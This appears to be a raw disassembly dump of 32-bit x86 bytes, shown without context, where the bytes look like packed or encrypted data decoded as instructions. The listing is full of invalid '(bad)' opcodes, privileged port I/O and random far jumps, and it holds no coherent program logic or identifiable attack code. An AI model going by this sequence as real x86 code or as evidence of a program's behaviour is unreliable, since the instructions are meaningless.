  425bba:	adc    BYTE PTR [edx-0x68],dl
  425bbd:	push   edi
  425bbe:	pop    ecx
  425bbf:	fwait
  425bc0:	test   eax,0x89f55f7f
  425bc5:	xor    bl,cl
  425bc7:	mov    ds:0x42a6200,eax
  425bcc:	imul   ebx,DWORD PTR [esi],0xffffff95
  425bcf:	retf   
  425bd0:	jmp    0x425bbf
  425bd2:	and    ebp,DWORD PTR fs:[edi]
  425bd5:	xchg   DWORD PTR [ebx+0x20],ebx
  425bd8:	arpl   WORD PTR [ebp-0x3639011f],bp
  425bde:	call   0xc7f:0x1dcb5ba6
  425be5:	int    0x78
  425be7:	test   eax,0xb1b08560
  425bec:	sbb    al,0x31
  425bee:	shr    ch,1
  425bf0:	jecxz  0x425c33
  425bf2:	(bad)  
  425bf3:	rol    ch,cl
  425bf5:	mov    edx,0x3ddde39c
  425bfa:	cmp    DWORD PTR [ebx-0x42],esi
  425bfd:	push   0xf1f61e66
  425c02:	js     0x425b8a
  425c04:	mov    ebp,0x663ad7e8
  425c09:	cdq    
  425c0a:	jl     0x425b9e
  425c0c:	in     eax,dx
  425c0d:	sub    eax,0xad7c669a
  425c12:	push   es
  425c13:	leave  
  425c14:	pop    ebx
  425c15:	bound  si,DWORD PTR [edx]
  425c18:	lods   al,BYTE PTR ds:[esi]
  425c19:	mov    al,0xc
  425c1b:	sar    BYTE PTR [edi],1
  425c1d:	into   
  425c1e:	mov    cl,0x88
  425c20:	sub    edx,DWORD PTR [edx-0x67120eda]
  425c26:	iret   
  425c27:	sbb    bh,BYTE PTR [esi+0x6]
  425c2a:	sub    BYTE PTR [ecx+0x5431ba72],al
  425c30:	jp     0x425bf1
  425c32:	bound  eax,QWORD PTR [edi]
  425c34:	inc    ebx
  425c35:	test   eax,0x4d0fff7c
  425c3a:	add    al,0x2a
  425c3c:	ja     0x425c9a
  425c3e:	jmp    0x24e4:0x2525539c
  425c45:	leave  
  425c46:	test   BYTE PTR [edx-0x17c18486],bl
  425c4c:	ret    
  425c4d:	scas   eax,DWORD PTR es:[edi]
  425c4e:	jecxz  0x425c01
  425c50:	js     0x425cbd
  425c52:	repz in al,0x91
  425c55:	ret    0xc0b2
  425c58:	jmp    0xb277e81
  425c5d:	out    0xb2,eax
  425c5f:	outs   dx,BYTE PTR ds:[esi]
  425c60:	fstp   QWORD PTR cs:[edi-0x57]
  425c64:	ret    0xe231
  425c67:	or     al,0x1e
  425c69:	mov    DWORD PTR [esi+0x79],0xb93708f9
  425c70:	or     edi,esi
  425c72:	or     al,0xba
  425c74:	loopne 0x425cbf
  425c76:	pop    ss
  425c77:	test   BYTE PTR [esi],al
  425c79:	sahf   
  425c7a:	jecxz  0x425c1f
  425c7c:	(bad)  
  425c7e:	loope  0x425c36
  425c80:	sub    eax,0xf7dc30e3
  425c85:	adc    ch,BYTE PTR [edi-0x76]
  425c88:	push   es
  425c89:	test   BYTE PTR gs:[ebx+0x47],ah
  425c8d:	(bad)  
  425c8e:	mov    eax,ds:0xe8a3121c
  425c93:	fcom   QWORD PTR [esi]
  425c95:	nop
  425c96:	push   edx
  425c97:	cs leave 
  425c99:	stos   BYTE PTR es:[edi],al
  425c9a:	retf   
  425c9b:	dec    esp
  425c9c:	mov    al,ds:0x61aa1d3f
  425ca1:	out    dx,eax
  425ca2:	and    DWORD PTR [ebx-0x2c68683b],ebp
  425ca8:	stos   DWORD PTR es:[edi],eax
  425ca9:	out    0x8,al
  425cab:	inc    eax
  425cac:	in     eax,dx
  425cad:	cmp    eax,DWORD PTR [edx-0x4bd0ef76]
  425cb3:	lods   al,BYTE PTR ds:[esi]
  425cb4:	call   0xf8e5:0x48ebbf8
  425cbb:	lods   eax,DWORD PTR ds:[esi]
  425cbc:	loop   0x425cb7
  425cbe:	pop    esi
  425cbf:	test   al,0x7
  425cc1:	inc    eax
  425cc2:	mov    ebx,0x9c91c556
  425cc7:	shl    esp,cl
  425cc9:	ror    BYTE PTR [ecx-0x23dd24c9],cl
  425ccf:	inc    esp
  425cd0:	pushf  
  425cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cd2:	mov    bl,BYTE PTR [esp+ebx*2]
  425cd5:	call   0xdac5:0x1691e812
  425cdc:	cli    
  425cdd:	adc    BYTE PTR [edx],bl
  425cdf:	out    0xfe,eax
  425ce1:	fdiv   QWORD PTR [edi+0x5e12ce4b]
  425ce7:	scas   al,BYTE PTR es:[edi]
  425ce8:	mov    bh,0xa1
  425cea:	mov    eax,0x1b563151
  425cef:	sbb    eax,0x17700e21
  425cf4:	pushf  
  425cf5:	lea    edi,[esi-0x5d216063]
  425cfb:	mov    al,ds:0x4727bf78
  425d00:	xlat   BYTE PTR ds:[ebx]
  425d01:	mov    cl,0xb
  425d03:	call   0xf801530a
  425d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d09:	xor    ecx,DWORD PTR [edx+0x94da65c]
  425d0f:	jecxz  0x425d66
  425d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d12:	push   0x6b
  425d14:	adc    DWORD PTR [edi+0x1a],esp
  425d17:	ret    
  425d18:	sub    DWORD PTR [edi+0x7bea2ee5],ebp
  425d1e:	push   esp
  425d1f:	enter  0xd601,0x7
  425d23:	mov    esi,0xc5103208
  425d28:	sub    ebp,ebp
  425d2a:	adc    al,0x26
  425d2c:	inc    ebp
  425d2d:	outs   dx,DWORD PTR ds:[esi]
  425d2e:	pop    ds
  425d2f:	mov    ecx,0x9927169e
  425d34:	mov    DWORD PTR [edx],ecx
  425d36:	jg     0x425d71
  425d38:	push   edi
  425d39:	mov    al,ds:0xab259a3f
  425d3e:	and    edi,esp
  425d40:	dec    esp
  425d41:	cld    
  425d42:	out    dx,eax
  425d43:	xchg   esp,eax
  425d44:	data16 stc 
  425d46:	js     0x425d6b
  425d48:	push   esp
  425d49:	stos   DWORD PTR es:[edi],eax
  425d4a:	add    al,0x6f
  425d4c:	or     cl,BYTE PTR [edx]
  425d4e:	mov    esi,0x81298ed0
  425d53:	sbb    al,0x5b
  425d55:	inc    esp
  425d56:	xor    DWORD PTR [ecx],edi
  425d58:	hlt    
  425d59:	test   BYTE PTR [ecx+0x4],cl
  425d5c:	inc    esp
  425d5d:	push   0xffffff8b
  425d5f:	in     al,0x39
  425d61:	mov    gs,ebx
  425d63:	push   ecx
  425d64:	push   cs
  425d65:	pop    ds
  425d66:	adc    DWORD PTR [edx],eax
  425d68:	imul   ebx,ebp,0xe8bd00c8
  425d6e:	cmp    al,0xc6
  425d70:	ja     0x425d2c
  425d72:	jae    0x425dad
  425d74:	int    0x97
  425d76:	xchg   esi,eax
  425d77:	push   cs
  425d78:	retf   
  425d79:	jmp    0x425d38
  425d7b:	mov    cl,BYTE PTR [ebp+0x33]
  425d7e:	test   eax,0x6a5e3b9d
  425d83:	out    0x62,eax
  425d85:	push   es
  425d86:	fisttp DWORD PTR [edx]
  425d88:	nop
  425d89:	mov    al,ds:0x77ac7d7f
  425d8e:	cmp    DWORD PTR [esp+ebx*1-0x6e2ba83f],0x774d9174
  425d99:	pop    ecx
  425d9a:	call   0xa3aa6591
  425d9f:	mul    BYTE PTR [eax+0x49b0bee1]
  425da5:	adc    BYTE PTR [esi+0x7fc56cf0],dl
  425dab:	test   eax,esp
  425dad:	inc    edx
  425dae:	xor    esi,DWORD PTR [ebx-0x26]
  425db1:	in     al,dx
  425db2:	push   ecx
  425db3:	sub    DWORD PTR [ebx+ebp*4-0x484f3231],0xcd5c5773
  425dbe:	ficom  WORD PTR [ecx]
  425dc0:	outs   dx,BYTE PTR ds:[esi]
  425dc1:	sbb    edi,DWORD PTR [eax-0xa6ffdfa]
  425dc7:	or     DWORD PTR [ecx+0x50],edx
  425dca:	das    
  425dcb:	inc    edx
  425dcc:	int3   
  425dcd:	aad    0x0
  425dcf:	or     esp,esi
  425dd1:	mov    ch,0x34
  425dd3:	clc    
  425dd4:	scas   eax,DWORD PTR es:[edi]
  425dd5:	enter  0x9f77,0xaa
  425dd9:	fdiv   DWORD PTR [ebx-0x337cd4d7]
  425ddf:	std    
  425de0:	or     edx,eax
  425de2:	addr16 push cs
  425de4:	outs   dx,BYTE PTR ds:[esi]
  425de5:	enter  0xd92f,0x96
  425de9:	(bad)
  425ded:	pop    edx
  425dee:	cmp    eax,0x97d36ae0
  425df3:	aam    0x30
  425df5:	(bad)  [ebp+0x72]
  425df8:	add    edi,DWORD PTR ds:0x11548578
  425dfe:	fld    DWORD PTR [edx+0x5be016f4]
  425e04:	dec    edx
  425e05:	mov    bh,0x8a
  425e07:	imul   eax,DWORD PTR [esi],0x56826272
  425e0d:	ss es jl 0x425e7d
  425e11:	call   0xcaaf:0x5315addc
  425e18:	xchg   edi,eax
  425e19:	cmc    
  425e1a:	not    BYTE PTR [edx-0x54]
  425e1d:	pop    esp
  425e1e:	loop   0x425e4f
  425e20:	jo     0x425dd0
  425e22:	adc    eax,0xf0d1d0a9
  425e27:	or     BYTE PTR [esi-0x6f4f3be1],bh
  425e2d:	mov    ds:0x82e69b90,al
  425e32:	mov    esi,0x117be2b1
  425e37:	jmp    0x47061f2d
  425e3c:	popa   
  425e3d:	sbb    ah,BYTE PTR [ebx]
  425e3f:	dec    eax
  425e40:	daa    
  425e41:	sub    al,BYTE PTR [eax]
  425e43:	mov    dh,0x1e
  425e45:	add    BYTE PTR [eax],al
  425e47:	add    BYTE PTR [eax],al
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x94
  425e57:	mov    eax,ds:0xec036fe8
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	add    DWORD PTR [esi],0x0
  425e61:	add    BYTE PTR [ebx-0x64],dl
  425e64:	mov    BYTE PTR [ecx+0x2d],al
  425e67:	push   esp
  425e68:	lea    edi,[esi-0x43c51f20]
  425e6e:	mov    edx,0x70bf15d8
  425e73:	cmp    DWORD PTR [edi-0x15],ebx
  425e76:	mov    bl,BYTE PTR [esi+0x72]
  425e79:	ret    
  425e7a:	cld    
  425e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e7c:	ins    DWORD PTR es:[edi],dx
  425e7d:	aaa    
  425e7e:	dec    esi
  425e7f:	or     ebp,esi
  425e81:	aad    0x6
  425e83:	test   al,dl
  425e85:	mov    al,0x8d
  425e87:	push   ss
  425e88:	xchg   edi,eax
  425e89:	imul   esi,DWORD PTR [ebp+eiz*8+0x239cf95f],0xffffffd2
  425e91:	loope  0x425e5f
  425e93:	jp     0x425e3d
  425e95:	int3   
  425e96:	push   edx
  425e97:	sbb    DWORD PTR [eax-0x32],edi
  425e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e9b:	sahf   
  425e9c:	adc    BYTE PTR [edx-0x26],bh
  425e9f:	fld    QWORD PTR [ecx+esi*8-0x63040bb2]
  425ea6:	enter  0x5380,0x3e
  425eaa:	mov    al,0xd5
  425eac:	lahf   
  425ead:	cwde   
  425eae:	mov    bl,0x79
  425eb0:	lods   al,BYTE PTR ds:[esi]
  425eb1:	push   0x843930e2
  425eb6:	mov    bl,0xb8
  425eb8:	fbstp  TBYTE PTR [ecx+0x27]
  425ebb:	ror    DWORD PTR [ebp+0x1d09f804],1
  425ec1:	add    BYTE PTR ds:0x52ab7165,ch
  425ec7:	xchg   edi,eax
  425ec8:	cmp    al,0x99
  425eca:	mov    ch,0xe6
  425ecc:	shr    BYTE PTR [edi-0x168ea2b6],cl
  425ed2:	mov    ?,WORD PTR [ecx-0x22]
  425ed5:	push   es
  425ed6:	imul   eax,edx,0xd701b7bb
  425edc:	dec    ebx
  425edd:	jb     0x425f46
  425edf:	sbb    al,0x7d
  425ee1:	in     eax,0x9c
  425ee3:	popf   
  425ee4:	mov    al,0x57
  425ee6:	mov    ch,0x46
  425ee8:	or     dl,0x23
  425eeb:	mov    al,ds:0x60e73bc0
  425ef0:	stc    
  425ef1:	jmp    0xb3cd:0x4650ba44
  425ef8:	test   al,0x95
  425efa:	and    esi,DWORD PTR [ecx+0x7e2401a8]
  425f00:	jae    0x425eb2
  425f02:	dec    ecx
  425f03:	push   0xa32621cc
  425f08:	nop
  425f09:	add    al,0xc6
  425f0b:	test   BYTE PTR [edx],dh
  425f0d:	cmp    dh,BYTE PTR [esi-0x65d72ff9]
  425f13:	pushf  
  425f14:	std    
  425f15:	jg     0x425f46
  425f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f18:	mov    WORD PTR [ebp-0x29],es
  425f1b:	into   
  425f1c:	in     al,dx
  425f1d:	call   0xb168:0x15a9b51c
  425f24:	sbb    DWORD PTR [ebx-0x7bfb689e],0x3e
  425f2b:	inc    ebx
  425f2c:	mov    bh,0x92
  425f2e:	mov    ds:0x881e3a7b,al
  425f33:	xchg   ecx,eax
  425f34:	retf   0xdfdd
  425f37:	add    DWORD PTR [ebx+0x70],eax
  425f3a:	loopne 0x425f3b
  425f3c:	and    al,0xa8
  425f3e:	xchg   edx,eax
  425f3f:	leave  
  425f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f41:	pop    ss
  425f42:	test   eax,0xa98e0fb9
  425f47:	add    al,0x7f
  425f49:	or     esp,esi
  425f4b:	cmp    bh,ch
  425f4d:	je     0x425f2c
  425f4f:	sti    
  425f50:	jmp    0xf166:0xd9253c7a
  425f57:	sbb    ebp,edx
  425f59:	(bad)  
  425f5a:	or     ah,BYTE PTR [esi]
  425f5c:	jecxz  0x425f7f
  425f5e:	dec    esi
  425f5f:	lods   al,BYTE PTR ds:[esi]
  425f60:	in     al,0x89
  425f62:	sar    BYTE PTR fs:[edx-0x73],0x5d
  425f67:	jle    0x425f9f
  425f69:	xchg   ebp,eax
  425f6a:	push   0xffffffaf
  425f6c:	fdiv   DWORD PTR [edi-0x3152bee4]
  425f72:	dec    edi
  425f73:	imul   ebx,DWORD PTR [esi-0x8],0xffffffeb
  425f77:	fldcw  WORD PTR [ecx+0x79bb89c0]
  425f7d:	sub    eax,0xe6a6b35
  425f82:	sti    
  425f83:	gs dec edx
  425f85:	gs push eax
  425f87:	imul   edx,DWORD PTR [ebx-0xd],0xac81dc9a
  425f8e:	xor    edx,DWORD PTR [edi]
  425f90:	xlat   BYTE PTR ds:[ebx]
  425f91:	add    edx,DWORD PTR [ebx-0x13bc214c]
  425f97:	mov    gs,WORD PTR [edx+0x3a]
  425f9a:	xchg   DWORD PTR [ebx+0x7dfaeb5f],edx
  425fa0:	leave  
  425fa1:	xor    eax,0x76af000c
  425fa6:	std    
  425fa7:	ds (bad) 
  425fa9:	out    0xfc,al
  425fab:	cmp    esp,DWORD PTR [edi-0x73]
  425fae:	dec    ecx
  425faf:	push   edx
  425fb0:	or     DWORD PTR [ecx],esi
  425fb2:	inc    ecx
  425fb3:	and    al,BYTE PTR [ebp-0x7f6654cc]
  425fb9:	int    0x35
  425fbb:	in     al,0x14
  425fbd:	test   eax,0x109c7511
  425fc2:	dec    ebx
  425fc3:	cmp    al,0x4c
  425fc5:	sub    al,0xf9
  425fc7:	mov    ds:0x2b2731cd,eax
  425fcc:	add    DWORD PTR ds:0x56fdda52,edx
  425fd2:	mov    ebx,0xd894323f
  425fd7:	xor    al,0xbf
  425fd9:	pushf  
  425fda:	xchg   edi,eax
  425fdb:	(bad)  [edx+ecx*8-0x611e9561]
  425fe2:	push   ebx
  425fe3:	xchg   ecx,eax
  425fe4:	xor    ah,BYTE PTR [eax-0x247a7db3]
  425fea:	test   BYTE PTR [eax],cl
  425fec:	imul   edi,DWORD PTR [edx+esi*2-0x360f6bd9],0xfb5cf80c
  425ff7:	pop    esp
  425ff8:	xlat   BYTE PTR ds:[ebx]
  425ff9:	ret    
  425ffa:	outs   dx,DWORD PTR ds:[esi]
  425ffb:	push   ebx
  425ffc:	or     dh,dl
  425ffe:	jmp    0xbea7:0xc05d006
  426005:	fwait
  426006:	xchg   esp,eax
  426007:	add    BYTE PTR [ecx],ah
  426009:	mov    edx,0xa81274
  42600e:	ss fmul st,st(6)
  426011:	sub    DWORD PTR [edi+0x0],esi
  426014:	jne    0x42606c
  426016:	mov    ch,0xe5
  426018:	mov    eax,0xecbcffd3
  42601d:	jmp    0xe5ed:0xfebc460a
  426024:	cmc    
  426025:	fwait
  426026:	adc    eax,0xd629d5a8
  42602b:	inc    edi
  42602c:	and    ah,BYTE PTR [eax-0x5238bc0f]
  426032:	retf   
  426033:	fmul   DWORD PTR [edi]
  426035:	outs   dx,DWORD PTR ds:[esi]
  426036:	dec    edi
  426037:	call   0x2c59:0x72d6e906
  42603e:	sbb    BYTE PTR [ebp+0x73b07064],0xe3
  426045:	jmp    0x3d11:0xd9e8f4ed
  42604c:	xchg   ebx,eax
  42604d:	into   
  42604e:	lods   eax,DWORD PTR ds:[esi]
  42604f:	mov    edx,0xb3720a84
  426054:	sub    eax,0x864f6db
  426059:	jbe    0x4260ba
  42605b:	xchg   esi,eax
  42605c:	iret   
  42605d:	test   bl,cl
  42605f:	and    cl,BYTE PTR [edi]
  426061:	stos   BYTE PTR es:[edi],al
  426062:	loope  0x4260e0
  426064:	cwde   
  426065:	cmp    BYTE PTR [eax-0xffc7e59],0x6d
  42606c:	mov    al,ds:0xdce3b04
  426071:	jg     0x426057
  426073:	mov    ds:0x57565995,al
  426078:	push   esi
  426079:	fsubr  QWORD PTR [edi]
  42607b:	mov    al,0x0
  42607d:	lahf   
  42607e:	fnsave [ebx]
  426080:	shl    DWORD PTR [edx+ebp*1+0x75],0x25
  426085:	icebp  
  426086:	iret   
  426087:	test   BYTE PTR [ebx-0x5bf745f4],ch
  42608d:	xor    ch,dl
  42608f:	jmp    0x61e4:0xa4636411
  426096:	cmp    ebp,DWORD PTR [ebx+esi*8+0x3e]
  42609a:	stos   BYTE PTR es:[edi],al
  42609b:	pop    ebx
  42609c:	and    eax,0xe9b99fd8
  4260a1:	jb     0x426060
  4260a3:	rcr    DWORD PTR [esi-0x38b83fe2],1
  4260a9:	inc    ebp
  4260aa:	pop    esi
  4260ab:	js     0x426116
  4260ad:	pop    edx
  4260ae:	fimul  WORD PTR [ebx+0xdd81753]
  4260b4:	sub    dh,BYTE PTR [eax]
  4260b6:	inc    ebp
  4260b7:	mov    ebp,0x8b09a7ef
  4260bc:	repz sub eax,0x36a330e5
  4260c2:	mov    esp,0x2855b4ac
  4260c7:	std    
  4260c8:	jl     0x4260ea
  4260ca:	pop    ebx
  4260cb:	rcl    DWORD PTR [ebx],0xe1
  4260ce:	cs or  eax,0x3a207eab
  4260d4:	xor    cl,BYTE PTR [edx]
  4260d6:	arpl   WORD PTR [ecx+0xd25cf9e],cx
  4260dc:	xchg   ecx,eax
  4260dd:	in     al,dx
  4260de:	mov    ds:0x49070a6d,al
  4260e3:	pop    esp
  4260e4:	shr    dl,1
  4260e6:	cmc    
  4260e7:	lea    ecx,[ebx+0x7cfeb9cf]
  4260ed:	xchg   DWORD PTR es:[ebx+0x71],edi
  4260f1:	ins    DWORD PTR es:[edi],dx
  4260f2:	leave  
  4260f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260f4:	push   cs
  4260f5:	test   BYTE PTR [esi],dh
  4260f7:	xchg   esi,eax
  4260f8:	(bad)  
  4260f9:	mov    ebp,0x450b8cba
  4260fe:	je     0x4260d1
  426100:	std    
  426101:	int3   
  426102:	cld    
  426103:	pushf  
  426104:	xchg   BYTE PTR [eax+0x5a],bh
  426107:	pushf  
  426108:	push   cs
  426109:	pushf  
  42610a:	out    dx,al
  42610b:	aad    0x68
  42610d:	retf   
  42610e:	pop    es
  42610f:	mov    bl,0xff
  426111:	(bad)
  426114:	jns    0x4260bc
  426116:	cs mov eax,0x26cf436b
  42611c:	mov    dh,0x69
  42611e:	gs fwait
  426120:	(bad)  
  426121:	sbb    edx,edi
  426123:	clc    
  426124:	and    eax,0xf3e47982
  426129:	(bad)  [edx-0x7c82cf04]
  42612f:	mov    ds:0x54af3aa9,eax
  426134:	jecxz  0x42615d
  426136:	int3   
  426137:	sbb    BYTE PTR [edi],cl
  426139:	fs gs dec esi
  42613c:	arpl   bx,cx
  42613e:	test   eax,0x5c0786ea
  426143:	ret    
  426144:	fnstenv [ebp+ebx*8-0x1e]
  426148:	sbb    DWORD PTR [edi-0x21],edi
  42614b:	repz repnz or al,BYTE PTR [eax]
  42614f:	test   al,0x26
  426151:	aam    0xb1
  426153:	cmp    eax,0xa11587f2
  426158:	sub    BYTE PTR [eax+0x172183b8],dh
  42615e:	loop   0x426196
  426160:	pop    ss
  426161:	mov    bh,0x66
  426163:	pop    esp
  426164:	loop   0x42614f
  426166:	in     eax,0xb0
  426168:	mov    edi,0x945538c2
  42616d:	dec    esi
  42616e:	pop    eax
  42616f:	retf   
  426170:	ret    0x4fc0
  426173:	popf   
  426174:	push   esi
  426175:	inc    edi
  426176:	pop    esi
  426177:	or     dh,BYTE PTR [esi+esi*1]
  42617a:	repnz test DWORD PTR [edi+0x77c980bb],edi
  426181:	xlat   BYTE PTR ds:[ebx]
  426182:	xlat   BYTE PTR ds:[ebx]
  426183:	push   0x945dbb2f
  426188:	(bad)  
  426189:	xor    al,0xa2
  42618b:	inc    esp
  42618c:	retf   
  42618d:	stos   BYTE PTR es:[edi],al
  42618e:	cdq    
  42618f:	fild   QWORD PTR [edi]
  426191:	dec    BYTE PTR [edx]
  426193:	jbe    0x42619e
  426195:	push   ds
  426196:	and    bh,BYTE PTR [edx]
  426198:	or     eax,edi
  42619a:	and    ebx,DWORD PTR [ecx-0x17]
  42619d:	pop    ds
  42619e:	rcl    BYTE PTR [esi+0x78],1
  4261a1:	(bad)  
  4261a2:	mov    ah,0x62
  4261a4:	dec    eax
  4261a5:	and    BYTE PTR [eax],bl
  4261a7:	mov    ds:0xc5a9c34b,eax
  4261ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261ad:	mov    bl,0x71
  4261af:	xor    al,0x44
  4261b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261b2:	test   eax,0x2460c60e
  4261b7:	fldcw  WORD PTR [edx]
  4261b9:	xchg   ebx,eax
  4261ba:	jle    0x42621a
  4261bc:	cs adc eax,edx
  4261bf:	retf   
  4261c0:	cdq    
  4261c1:	bound  eax,QWORD PTR [edi+esi*4-0x4f78c524]
  4261c8:	fsubr  DWORD PTR [ecx+0x6d]
  4261cb:	daa    
  4261cc:	lock iret 
  4261ce:	pop    edi
  4261cf:	dec    edx
  4261d0:	mov    ebx,0xf19d29de
  4261d5:	nop
  4261d6:	cmp    eax,0x25bf2b53
  4261db:	sbb    DWORD PTR [eax+edx*2-0x4a],ecx
  4261df:	jl     0x4261e8
  4261e1:	xor    BYTE PTR [ebx],bh
  4261e3:	push   0x22
  4261e5:	rol    bh,1
  4261e7:	repnz push 0x4c
  4261ea:	sbb    eax,0x5cec5172
  4261ef:	shl    BYTE PTR [edx+0x66347e65],0x62
  4261f6:	and    BYTE PTR [ecx],ch
  4261f8:	and    bl,BYTE PTR [esi-0x76]
  4261fb:	leave  
  4261fc:	popf   
  4261fd:	mov    esp,0xd57a7a4
  426202:	shl    DWORD PTR [eax-0x4c],cl
  426205:	ss cwde 
  426207:	outs   dx,DWORD PTR ds:[esi]
  426208:	dec    ebp
  426209:	mov    ebp,0x9ac897e2
  42620e:	sbb    BYTE PTR [esp+edi*8-0x6b4d7acf],al
  426215:	test   BYTE PTR [ecx+0x39],0x9e
  426219:	jno    0x426205
  42621b:	lahf   
  42621c:	rcl    DWORD PTR [ebx+ecx*4+0x61],0x70
  426221:	and    eax,0xd78e88f7
  426226:	loopne 0x4261e1
  426228:	cmp    DWORD PTR [edi+eax*8-0x2873830a],esp
  42622f:	jmp    0xd927c9ac
  426234:	and    DWORD PTR [ebx-0x2c3b8a0d],edi
  42623a:	ins    BYTE PTR es:[edi],dx
  42623b:	scas   al,BYTE PTR es:[edi]
  42623c:	std    
  42623d:	call   DWORD PTR es:[eax-0x7f077b5d]
  426244:	pushf  
  426245:	ins    DWORD PTR es:[edi],dx
  426246:	add    BYTE PTR [esp+esi*2-0x69],cl
  42624a:	xchg   ebx,eax
  42624b:	dec    esi
  42624c:	sub    al,0x4c
  42624e:	jmp    0x426292
  426250:	add    edi,DWORD PTR [ebp+0x1e16160]
  426256:	aas    
  426257:	mov    ah,0x66
  426259:	fisttp WORD PTR [eax-0x50662c68]
  42625f:	pushf  
  426260:	xor    al,bh
  426262:	push   ebx
  426263:	mov    BYTE PTR [ebp-0x53],ch
  426266:	mov    ah,0x2c
  426268:	stos   BYTE PTR es:[edi],al
  426269:	inc    esi
  42626a:	and    cl,BYTE PTR [edi-0x21927dec]
  426270:	ret    0x7c30
  426273:	and    ebp,DWORD PTR [edi+0x5d]
  426276:	daa    
  426277:	cmp    cl,BYTE PTR [edx]
  426279:	lods   eax,DWORD PTR cs:[esi]
  42627b:	inc    ecx
  42627c:	pusha  
  42627d:	mov    WORD PTR [ebx],cs
  42627f:	xor    BYTE PTR [ebp-0x1cefff61],bl
  426285:	fdivr  QWORD PTR [eax+0x7]
  426288:	push   cs
  426289:	xor    ebp,0x4b
  42628c:	fldln2 
  42628e:	dec    esi
  42628f:	stos   BYTE PTR es:[edi],al
  426290:	mov    esi,0xae6b67ed
  426295:	daa    
  426296:	mov    DWORD PTR [ecx+eax*2+0xf],eax
  42629a:	ins    BYTE PTR es:[edi],dx
  42629b:	push   cs
  42629c:	jmp    0x4262dd
  42629e:	test   esi,edi
  4262a0:	test   bl,bh
  4262a2:	lds    ebp,FWORD PTR [esi-0x16]
  4262a5:	cmc    
  4262a6:	xchg   BYTE PTR [ecx+0x49fdd9fc],dh
  4262ac:	xchg   esp,eax
  4262ad:	sbb    eax,0x6947b564
  4262b2:	xchg   ecx,eax
  4262b3:	pushf  
  4262b4:	js     0x4262b1
  4262b6:	push   ds
  4262b7:	rol    dh,0x56
  4262ba:	push   ds
  4262bb:	cli    
  4262bc:	jg     0x426330
  4262be:	inc    ecx
  4262bf:	data16 jg 0x4262a9
  4262c2:	adc    al,0x81
  4262c4:	adc    ah,BYTE PTR [ebp+0x7800218b]
  4262ca:	sub    eax,0x3bb6e3a9
  4262cf:	inc    esi
  4262d0:	inc    esp
  4262d1:	mov    ebx,0xea0b4bb2
  4262d6:	xchg   ebp,eax
  4262d7:	xlat   BYTE PTR ds:[ebx]
  4262d8:	nop
  4262d9:	or     bl,BYTE PTR [ebp-0x3a8c1f3c]
  4262df:	in     eax,dx
  4262e0:	pop    ss
  4262e1:	cld    
  4262e2:	psubb  mm3,QWORD PTR ds:0x39bc1d22
  4262e9:	popa   
  4262ea:	push   ebx
  4262eb:	fcomp  DWORD PTR [edi+esi*1-0x77]
  4262ef:	xchg   ebp,eax
  4262f0:	lock adc ebp,ebx
  4262f3:	xchg   edi,eax
  4262f4:	cdq    
  4262f5:	retf   0xb448
  4262f8:	jge    0x426293
  4262fa:	fmul   QWORD PTR [esi-0x5bbaa6f1]
  426300:	repnz sub eax,0x874d42b3
  426306:	xchg   dx,ax
  426308:	out    0x82,al
  42630a:	jo     0x42635f
  42630c:	push   edx
  42630d:	pop    ss
  42630e:	(bad)  
  42630f:	adc    edx,ebx
  426311:	in     eax,0x61
  426313:	cmc    
  426314:	xchg   esi,eax
  426315:	mul    DWORD PTR [edx+0x227e05e5]
  42631b:	lods   eax,DWORD PTR ds:[esi]
  42631c:	xor    ah,bh
  42631e:	leave  
  42631f:	mov    BYTE PTR [ebp+ecx*8+0x4df778bb],bl
  426326:	add    eax,0x95c25380
  42632b:	and    eax,0x357565b5
  426330:	ret    
  426331:	js     0x426335
  426333:	outs   dx,DWORD PTR ds:[esi]
  426334:	xor    BYTE PTR [edx+0x1ad6e606],cl
  42633a:	call   0x4c53:0xaa140c4e
  426341:	lds    ecx,FWORD PTR [ecx+0x5de76208]
  426347:	add    al,0xbb
  426349:	loop   0x426379
  42634b:	xor    DWORD PTR [edx],edx
  42634d:	xchg   ecx,eax
  42634e:	rcl    BYTE PTR [ebp-0x74170b20],0x48
  426355:	mov    bh,0x41
  426357:	dec    edi
  426358:	sub    ebp,DWORD PTR [ecx-0x2e4b963d]
  42635e:	mov    ecx,DWORD PTR [eax+0x7bcd7e8a]
  426364:	adc    al,0xe4
  426366:	aam    0xad
  426368:	mov    ebp,0xd91d4e6b
  42636d:	cmpxchg esi,ebp
  426370:	lock aaa 
  426372:	out    dx,eax
  426373:	sahf   
  426374:	push   edi
  426375:	fcmovnbe st,st(7)
  426377:	add    DWORD PTR [ebp+0xdba678e],esp
  42637d:	push   ecx
  42637e:	adc    dh,bl
  426380:	mov    eax,0x2d91a22b
  426385:	mov    ds:0xce4231e3,eax
  42638a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42638b:	or     cl,BYTE PTR [edi+eiz*4+0x46]
  42638f:	fistp  DWORD PTR [edx]
  426391:	lods   eax,DWORD PTR ds:[esi]
  426392:	xor    eax,0xe42fa9d0
  426397:	jne    0x4263f3
  426399:	lods   al,BYTE PTR ds:[esi]
  42639a:	not    DWORD PTR [edi+0x5bdff4ef]
  4263a0:	mov    edi,0xb8e5bade
  4263a5:	push   ebp
  4263a6:	fild   QWORD PTR [ebp+0x27e652b3]
  4263ac:	sub    esi,DWORD PTR [ebx-0x47]
  4263af:	mov    ch,0xca
  4263b1:	add    BYTE PTR [ecx],0x14
  4263b4:	mov    esp,0x8a55edce
  4263b9:	(bad)  
  4263ba:	shl    ebx,0x36
  4263bd:	sbb    eax,0xd1c845aa
